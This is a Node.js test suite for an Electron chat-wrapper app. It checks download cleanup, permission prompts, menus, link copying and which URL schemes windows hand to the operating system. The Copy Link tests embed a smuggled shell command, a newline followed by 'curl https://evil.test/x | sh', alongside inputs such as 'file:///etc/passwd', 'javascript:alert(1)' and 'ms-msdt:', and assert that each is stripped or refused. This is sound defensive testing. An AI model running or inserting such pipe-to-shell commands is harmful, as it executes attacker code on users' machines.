'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const EventEmitter = require('events');
const fs = require('fs');
const os = require('os');
const path = require('path');

const { createDirectOpen } = require('../lib/direct-open');
const { createPermissionManager } = require('../lib/permissions');
const { createAppMenu } = require('../lib/app-menu');
const { createSessionHelpers } = require('../lib/session-helpers');
const { createContextMenu } = require('../lib/context-menu');
const { createMainWindowManager } = require('../lib/main-window');
const { createQuickChatManager } = require('../lib/quick-chat');

function noopProxy(overrides = {}) {
  return new Proxy(overrides, {
    get(target, prop) {
      if (prop in target) return target[prop];
      if (prop === 'then') return undefined;
      return () => {};
    },
  });
}

test('direct-open keeps a finished download tracked until it is deleted', async t => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'direct-open-'));
  t.after(() => fs.rmSync(dir, { recursive: true, force: true }));
  // The module schedules a 120 s delete timer; do not let it hold the runner open.
  t.mock.timers.enable({ apis: ['setTimeout'] });
  const session = new EventEmitter();
  const ipcMain = new EventEmitter();
  const opened = [];
  const direct = createDirectOpen({
    session: { fromPartition: () => session },
    shell: { openPath: async file => { opened.push(file); return ''; } },
    fs, path,
    app: { getPath: () => dir },
    ipcMain,
    getAppConfig: () => ({ directOpenBehavior: 'shift-click' }),
    getAppPartition: () => 'persist:test',
    appSlug: 'test',
    safeShowError() {},
  });
  direct.registerDirectOpenDownloadHandler();
  direct.registerDirectOpenIpcHandler({
    DIRECT_OPEN_LINK: 'open', RENDERER_SETTINGS: 'settings', PRELOAD_PING: 'ping',
  });
  const wc = new EventEmitter();
  wc.id = 7;
  ipcMain.emit('open', { sender: { id: 7 } }, { href: 'https://example.test/file.txt' });

  const item = new EventEmitter();
  let savePath = '';
  Object.assign(item, {
    getURL: () => 'https://example.test/file.txt',
    getURLChain: () => ['https://example.test/file.txt'],
    getFilename: () => 'file.txt',
    getReceivedBytes: () => 0,
    getTotalBytes: () => 0,
    setSavePath: value => { savePath = value; },
  });
  session.emit('will-download', {}, item, wc);
  assert.ok(savePath, 'save path was assigned');
  fs.writeFileSync(savePath, 'data');

  item.emit('done', {}, 'completed');
  await new Promise(resolve => setImmediate(resolve));
  assert.deepEqual(opened, [savePath]);

  // The app quits before the 120 s delete timer fires.
  direct.cleanupTempFiles();
  assert.equal(fs.existsSync(savePath), false);
});

test('permission prompt describes clipboard requests as "clipboard"', async () => {
  let handler;
  const messages = [];
  const manager = createPermissionManager({
    dialog: { showMessageBox: async (...args) => { messages.push(args.at(-1).message); return { response: 1 }; } },
    getAppConfig: () => ({ permissionClipboardRead: 'ask' }),
    getAppUrl: () => 'https://app.test/chat',
  });
  manager.configure({ setPermissionRequestHandler: value => { handler = value; } });
  await new Promise(resolve => handler(
    { getURL: () => 'https://app.test/chat' }, 'clipboard-read', resolve, { requestingUrl: 'https://app.test/chat' }
  ));
  assert.equal(messages.length, 1);
  assert.match(messages[0], /clipboard/);
  assert.doesNotMatch(messages[0], /clipboard-read/);
});

test('Edit menu items are not appended twice', () => {
  const menuFactory = {
    buildFromTemplate: template => ({ items: template.map(item => ({ ...item })) }),
  };
  const app = createAppMenu({
    Menu: menuFactory,
    MenuItem: class {},
    BrowserWindow: { getFocusedWindow: () => null },
    dialog: {},
    getAppConfig: () => ({}),
    getMainWindow: () => null,
    initFindInPage: () => ({ buildEditFindMenuItems: () => [{ id: 'find', label: 'Find' }] }),
  });
  const submenu = {
    items: [],
    append(item) { this.items.push(item); },
    getMenuItemById(id) { return this.items.find(item => item.id === id) || null; },
  };
  app.appendEditItems(submenu);
  const first = submenu.items.length;
  assert.ok(first > 0);
  app.appendEditItems(submenu);
  assert.equal(submenu.items.length, first);
});

test('session helper error logs use the configured app label', () => {
  const logged = [];
  const original = console.error;
  console.error = (...args) => logged.push(args.map(String).join(' '));
  try {
    const win = {
      isDestroyed: () => false,
      getParentWindow: () => null,
      webContents: { reload() { throw new Error('boom'); } },
    };
    const helpers = createSessionHelpers({
      app: {}, BrowserWindow: { getFocusedWindow: () => win },
      dialog: {}, shell: {}, session: {}, clipboard: {}, fs, path,
      getAppConfig: () => ({}), getAppPartition: () => 'persist:test',
      appLabel: 'Copilot', safeShowError() {}, getMainWindow: () => win,
    });
    helpers.reloadApp();
  } finally {
    console.error = original;
  }
  assert.ok(logged.some(line => line.includes('Reload Copilot failed')), logged.join('\n'));
  assert.ok(!logged.some(line => line.includes('Gemini')));
});

test('Inspect Element is omitted when DevTools are disabled', () => {
  const build = devToolsEnabled => createContextMenu({
    Menu: {}, getAppConfig: () => ({ devToolsEnabled }), EXPORT_SCOPES: {},
    SEND_MODE: {}, ipcMain: null,
  }).buildContextMenuTemplate({ webContents: {} }, {}, {
    includeQuickChatFeatures: false, includeChatPaneFeatures: false, includeMarkdownExport: false,
  });
  assert.ok(build(true).some(item => item.label === 'Inspect Element'));
  assert.ok(!build(false).some(item => item.label === 'Inspect Element'));
});

test('Copy Link is offered only for copyable link URLs', () => {
  const copied = [];
  const build = params => createContextMenu({
    Menu: {}, getAppConfig: () => ({ devToolsEnabled: false }), EXPORT_SCOPES: {},
    SEND_MODE: {}, ipcMain: null, clipboard: { writeText: text => copied.push(text) },
  }).buildContextMenuTemplate({ webContents: {} }, params, {
    includeQuickChatFeatures: false, includeChatPaneFeatures: false, includeMarkdownExport: false,
  });
  const copyLink = params => build(params).find(item => item.label === 'Copy Link');

  assert.equal(copyLink({}), undefined);
  assert.equal(copyLink({ linkURL: '' }), undefined);
  assert.equal(copyLink({ linkURL: '   ' }), undefined);
  assert.equal(copyLink({ linkURL: 'javascript:alert(1)' }), undefined);
  assert.equal(copyLink({ linkURL: 'data:text/html,<p>x</p>' }), undefined);
  assert.equal(copyLink({ linkURL: 'blob:null/0f0e' }), undefined);
  assert.equal(copyLink({ linkURL: 'blob:file:///etc/passwd' }), undefined);
  assert.equal(copyLink({ linkURL: 'blob:javascript:alert(1)' }), undefined);
  assert.equal(copyLink({ linkURL: 'blob:blob:https://app.test/0f0e' }), undefined);
  assert.equal(copyLink({ linkURL: 'blob:mailto:someone@example.com' }), undefined);
  assert.equal(copyLink({ linkURL: 'file:///etc/passwd' }), undefined);
  assert.equal(copyLink({ linkURL: 'not a url' }), undefined);
  assert.equal(copyLink({ linkURL: 'https://app.test/' + 'a'.repeat(40000) }), undefined);

  const template = build({ linkURL: ' https://example.com/a?b=c#d ' });
  const index = template.findIndex(item => item.label === 'Copy Link');
  assert.equal(template[index - 1].role, 'paste');
  assert.equal(template[index + 1].type, 'separator');
  template[index].click();
  assert.deepEqual(copied, ['https://example.com/a?b=c#d']);

  assert.ok(copyLink({ linkURL: 'mailto:someone@example.com' }));
  assert.ok(copyLink({ linkURL: 'HTTP://EXAMPLE.COM/' }));
});

test('Copy Link writes only the normalized URL serialization', () => {
  const { getCopyableLinkUrl } = require('../lib/context-menu');

  // Embedded line breaks must never reach the clipboard (paste-into-shell).
  const injected = getCopyableLinkUrl('https://example.com/a\ncurl https://evil.test/x | sh\n');
  assert.ok(injected.startsWith('https://example.com/'));
  assert.doesNotMatch(injected, /[\r\n\t ]/);
  assert.equal(getCopyableLinkUrl('https://example.com/a\r\nb'), 'https://example.com/ab');
  assert.equal(getCopyableLinkUrl('\u0000https://example.com/'), 'https://example.com/');

  // Bidi overrides and spaces are percent-encoded, not copied literally.
  assert.equal(getCopyableLinkUrl('https://example.com/\u202Egnp.exe'), 'https://example.com/%E2%80%AEgnp.exe');
  assert.equal(getCopyableLinkUrl('https://example.com/a b'), 'https://example.com/a%20b');

  // IDN homograph hosts are copied as punycode.
  assert.equal(getCopyableLinkUrl('https://\u0430pple.com/'), 'https://xn--pple-43d.com/');

  // Output length is bounded after percent-encoding expansion.
  assert.equal(getCopyableLinkUrl('https://example.com/' + '\u00e9'.repeat(15000)), '');

  // mailto: header-injection sequences stay encoded.
  assert.equal(getCopyableLinkUrl('mailto:a@example.com?body=x%0Ay'), 'mailto:a@example.com?body=x%0Ay');
});

test('Copy Link strips the blob: prefix from blob:http(s) links', () => {
  const { getCopyableLinkUrl } = require('../lib/context-menu');

  assert.equal(
    getCopyableLinkUrl('blob:https://copilot.cloud.microsoft/0f0e1d2c-3b4a-5968-7766-554433221100'),
    'https://copilot.cloud.microsoft/0f0e1d2c-3b4a-5968-7766-554433221100'
  );
  assert.equal(getCopyableLinkUrl('blob:http://app.test/x'), 'http://app.test/x');
  assert.equal(getCopyableLinkUrl('BLOB:HTTPS://APP.TEST/x'), 'https://app.test/x');
  assert.equal(getCopyableLinkUrl('blob:https://app.test/x#frag'), 'https://app.test/x#frag');

  // The unwrapped URL receives the same normalization as a direct link.
  const injected = getCopyableLinkUrl('blob:https://app.test/a\ncurl https://evil.test/x | sh\n');
  assert.ok(injected.startsWith('https://app.test/'));
  assert.doesNotMatch(injected, /[\r\n\t ]/);
  assert.equal(getCopyableLinkUrl('blob:https://\u0430pple.com/x'), 'https://xn--pple-43d.com/x');

  // Only one http(s) layer is unwrapped.
  for (const value of [
    'blob:', 'blob:null/0f0e', 'blob:file:///etc/passwd', 'blob:javascript:alert(1)',
    'blob:data:,x', 'blob:blob:https://app.test/x', 'blob:mailto:a@example.com',
  ]) {
    assert.equal(getCopyableLinkUrl(value), '', value);
  }
});

function openHandlerFor(create) {
  let handler = null;
  const opened = [];
  const webContents = noopProxy({ setWindowOpenHandler: value => { handler = value; }, on() {}, once() {} });
  const BrowserWindow = function () {
    return noopProxy({ webContents, isDestroyed: () => false, getBounds: () => ({}) });
  };
  BrowserWindow.getFocusedWindow = () => null;
  BrowserWindow.getAllWindows = () => [];
  create({ BrowserWindow, shell: { openExternal: url => opened.push(url) }, webContents });
  return { handler: () => handler, opened };
}

function assertSchemeFilter({ handler, opened }) {
  const open = handler();
  assert.equal(typeof open, 'function');
  for (const url of ['https://a.test/x', 'http://a.test/x', 'mailto:a@b.test']) {
    assert.deepEqual(open({ url }), { action: 'deny' });
  }
  for (const url of ['file:///etc/passwd', 'ms-msdt:/id', 'javascript:alert(1)', 'not a url', '']) {
    assert.deepEqual(open({ url }), { action: 'deny' });
  }
  assert.deepEqual(opened, ['https://a.test/x', 'http://a.test/x', 'mailto:a@b.test']);
}

test('main window only hands web and mail links to the operating system', () => {
  const harness = openHandlerFor(({ BrowserWindow, shell }) => {
    let main = null;
    const manager = createMainWindowManager({
      BrowserWindow, Menu: { buildFromTemplate: () => ({ popup() {} }) },
      nativeImage: { createFromPath: () => noopProxy({ isEmpty: () => false }) },
      shell, path, dirname: __dirname,
      appConfig: { iconFileName: 'x.png' }, appLabel: 'Test',
      getAppConfig: () => ({}), getAppUrl: () => 'https://a.test', getAppPartition: () => 'persist:t',
      getMainWindow: () => main, setMainWindow: value => { main = value; },
      getAppIconImage: () => noopProxy({ isEmpty: () => false }), setAppIconImage() {},
      getTrayImage24: () => noopProxy({ isEmpty: () => false }), setTrayImage24() {},
      getIconPath: () => 'x.png', getInitialWindowBounds: () => ({ width: 800, height: 600 }),
      reveal() {}, setRoleTitle() {}, augmentApplicationMenu() {},
      registerShowContextMenuIpcHandler() {}, ensureDidStopLoadingHandler() {},
      attachCSSAndLayoutHandlers() {}, attachWindowStatePersistence() {}, attachFindResultForwarding() {},
      onDidStopLoading() {}, buildContextMenuTemplate: () => [], registerFindIpcHandlers() {},
      handleEscapeStopFind() {},
    });
    manager.createWindow();
  });
  assertSchemeFilter(harness);
});

test('quick chat windows only hand web and mail links to the operating system', () => {
  const harness = openHandlerFor(({ BrowserWindow, shell }) => {
    const manager = createQuickChatManager({
      app: {}, BrowserWindow, MenuItem: class {},
      Menu: { buildFromTemplate: () => ({}), getApplicationMenu: () => null, setApplicationMenu() {} },
      ipcMain: new EventEmitter(), dialog: {}, shell, clipboard: {}, path, dirname: __dirname,
      getMainWindow: () => null, getAppIconImage: () => null,
      getAppConfig: () => ({ enableQuickChat: true }), DEFAULT_APP_CONFIG: {},
      rendererApiGlobal: '__test', getAppUrl: () => 'https://a.test', appLabel: 'Test', appSlug: 'test',
      getAppPartition: () => 'persist:t', SEND_MODE: { PLAIN: 'plain', QUOTE: 'quote' }, IPC: {},
      reveal() {}, safeShowError() {}, getInitialWindowBounds: () => ({ width: 800, height: 600 }),
      attachWindowStatePersistence() {}, attachCSSAndLayoutHandlers() {}, attachFindResultForwarding() {},
      ensureDidStopLoadingHandler() {}, onDidStopLoading() {}, buildContextMenuTemplate: () => [],
      getSelectionFragment: async () => ({}), htmlToMarkdown: value => value, refreshTrayMenu() {},
    });
    manager.createQuickChatWindow();
  });
  assertSchemeFilter(harness);
});
